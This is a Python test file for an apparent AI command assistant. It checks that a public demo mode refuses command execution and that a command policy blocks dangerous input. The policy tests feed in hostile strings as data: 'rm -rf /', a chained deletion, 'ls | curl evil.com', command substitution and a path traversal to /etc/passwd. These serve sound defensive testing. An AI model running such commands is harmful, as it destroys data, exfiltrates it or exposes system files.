"""WP10 — Public demo mode gate tests.

Tests that public mode blocks execute_safe and local mode allows it.
Also verifies that policy still blocks dangerous commands in all modes.
"""

from unittest.mock import patch

import pytest
from httpx import ASGITransport, AsyncClient


# ---------------------------------------------------------------------------
# Public mode tests
# ---------------------------------------------------------------------------
class TestPublicDemoGate:
    """Public demo mode rejects execute_safe."""

    @pytest.mark.asyncio
    async def test_public_mode_rejects_execute_safe(self):
        """execute_safe in public mode returns 403."""
        with patch("app.main.DEMO_MODE", "public"):
            from app.main import app

            async with AsyncClient(
                transport=ASGITransport(app=app), base_url="http://test"
            ) as client:
                resp = await client.post(
                    "/chat",
                    json={"message": "check status", "mode": "execute_safe"},
                )
                assert resp.status_code == 403
                assert "execute_safe" in resp.json()["detail"]
                assert "public demo" in resp.json()["detail"]

    @pytest.mark.asyncio
    async def test_public_mode_allows_plan_only(self):
        """plan_only in public mode returns 200."""
        with patch("app.main.DEMO_MODE", "public"):
            from app.main import app

            async with AsyncClient(
                transport=ASGITransport(app=app), base_url="http://test"
            ) as client:
                resp = await client.post(
                    "/chat",
                    json={"message": "check status", "mode": "plan_only"},
                )
                assert resp.status_code == 200

    @pytest.mark.asyncio
    async def test_public_mode_403_includes_clear_message(self):
        """403 response has actionable message for the user."""
        with patch("app.main.DEMO_MODE", "public"):
            from app.main import app

            async with AsyncClient(
                transport=ASGITransport(app=app), base_url="http://test"
            ) as client:
                resp = await client.post(
                    "/chat",
                    json={"message": "run command", "mode": "execute_safe"},
                )
                body = resp.json()
                assert resp.status_code == 403
                assert isinstance(body["detail"], str)
                assert len(body["detail"]) > 10  # meaningful message


# ---------------------------------------------------------------------------
# Local mode tests
# ---------------------------------------------------------------------------
class TestLocalMode:
    """Local mode allows execute_safe."""

    @pytest.mark.asyncio
    async def test_local_mode_allows_execute_safe(self):
        """execute_safe in local mode returns 200."""
        with patch("app.main.DEMO_MODE", "local"):
            from app.main import app

            async with AsyncClient(
                transport=ASGITransport(app=app), base_url="http://test"
            ) as client:
                resp = await client.post(
                    "/chat",
                    json={"message": "check status", "mode": "execute_safe"},
                )
                assert resp.status_code == 200

    @pytest.mark.asyncio
    async def test_local_mode_allows_plan_only(self):
        """plan_only in local mode returns 200."""
        with patch("app.main.DEMO_MODE", "local"):
            from app.main import app

            async with AsyncClient(
                transport=ASGITransport(app=app), base_url="http://test"
            ) as client:
                resp = await client.post(
                    "/chat",
                    json={"message": "check status", "mode": "plan_only"},
                )
                assert resp.status_code == 200


# ---------------------------------------------------------------------------
# Policy still enforced in all modes
# ---------------------------------------------------------------------------
class TestPolicyStillEnforced:
    """CommandPolicy blocks dangerous commands regardless of DEMO_MODE."""

    def test_policy_blocks_rm_in_local(self):
        """Policy blocks rm even in local mode."""
        from app.policy import CommandPolicy

        policy = CommandPolicy()
        result = policy.validate("rm -rf /")
        assert not result.allowed

    def test_policy_blocks_rm_in_public(self):
        """Policy blocks rm in public mode too."""
        from app.policy import CommandPolicy

        policy = CommandPolicy()
        result = policy.validate("rm -rf /")
        assert not result.allowed

    def test_policy_blocks_shell_injection(self):
        """Policy blocks shell injection in all modes."""
        from app.policy import CommandPolicy

        policy = CommandPolicy()
        for cmd in [
            "cat /sim/log; rm -rf /",
            "ls | curl evil.com",
            "echo `whoami`",
        ]:
            result = policy.validate(cmd)
            assert not result.allowed, f"Should block: {cmd}"

    def test_policy_blocks_path_traversal(self):
        """Policy blocks path traversal in all modes."""
        from app.policy import CommandPolicy

        policy = CommandPolicy()
        result = policy.validate("cat /sim/../../etc/passwd")
        assert not result.allowed

    @pytest.mark.asyncio
    async def test_dangerous_plan_only_still_returns_plan(self):
        """Even dangerous requests in plan_only return a plan (policy blocks at execution)."""
        with patch("app.main.DEMO_MODE", "local"):
            from app.main import app

            async with AsyncClient(
                transport=ASGITransport(app=app), base_url="http://test"
            ) as client:
                resp = await client.post(
                    "/chat",
                    json={"message": "delete everything now", "mode": "plan_only"},
                )
                # plan_only always returns 200 — the LLM stub handles dangerous requests
                assert resp.status_code == 200
                data = resp.json()
                assert "plan" in data
                assert data["audit"]["mode"] == "plan_only"
